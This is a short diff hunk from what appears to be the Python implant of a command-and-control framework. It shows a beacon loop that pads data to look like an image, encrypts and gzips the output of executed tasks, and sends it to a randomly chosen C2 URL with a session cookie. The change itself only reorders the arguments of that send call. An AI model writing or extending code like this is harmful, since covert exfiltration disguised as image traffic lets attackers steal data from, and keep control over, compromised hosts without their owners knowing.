@@ -215,7 +215,7 @@ while(True):
                 dataimage = data.ljust(1500, bytes('\x00', "utf-8"))
             enc=encrypt(key, returnval, gzipfile=True)
             dataimagebytes = dataimage+enc
-            send_request("/%%s%%s" %% (random.choice(urls), uri), data=dataimagebytes, headers={"Cookie" : "SessionID=" + postcookie})
+            send_request("/%%s%%s" %% (random.choice(urls), uri), headers={"Cookie" : "SessionID=" + postcookie}, data=dataimagebytes)
 
       except Exception as e:
         print(e)
